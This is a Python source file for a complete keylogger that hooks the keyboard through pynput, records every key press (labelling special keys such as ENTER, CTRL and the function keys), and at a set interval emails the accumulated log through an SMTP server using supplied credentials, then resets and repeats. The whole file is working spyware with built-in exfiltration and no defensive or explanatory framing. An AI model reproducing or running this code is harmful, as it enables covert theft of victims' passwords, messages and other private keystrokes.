#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, time_interval, email, password, custom_smtp, smtp_port):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.custom_smtp = custom_smtp
        self.smtp_port = smtp_port
        self.start()

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = " |TAB| "
            elif key == key.shift:
                current_key = " |SHIFT| "
            elif key == key.backspace:
                current_key = " |<--| "
            elif key == key.alt:
                current_key = " |ALT| "
            elif key == key.f1:
                current_key = " |F1| "
            elif key == key.f2:
                current_key = " |F2| "
            elif key == key.f3:
                current_key = " |F3| "
            elif key == key.f4:
                current_key = " |F4| "
            elif key == key.f5:
                current_key = " |F5| "
            elif key == key.f6:
                current_key = " |F6| "
            elif key == key.f7:
                current_key = " |F7| "
            elif key == key.f8:
                current_key = " |F8| "
            elif key == key.f9:
                current_key = " |F9| "
            elif key == key.f10:
                current_key = " |F10| "
            elif key == key.f11:
                current_key = " |F11| "
            elif key == key.f12:
                current_key = " |F12| "
            elif key == key.enter:
                current_key = " |ENTER| "
            elif key == key.cmd:
                current_key = " |COMMAND| "
            elif key == key.menu:
                current_key = " |MENU| "
            elif key == key.num_lock:
                current_key = " |NUM LOCK| "
            elif key == key.delete:
                current_key = " |DELETE| "
            elif key == key.up:
                current_key = " |^UP| "
            elif key == key.down:
                current_key = " |vDOWN| "
            elif key == key.left:
                current_key = " |<LEFT| "
            elif key == key.right:
                current_key = " |RIGHT>| "
            elif key == key.ctrl:
                current_key = " |CTRL| "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(self.custom_smtp, int(self.smtp_port))
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
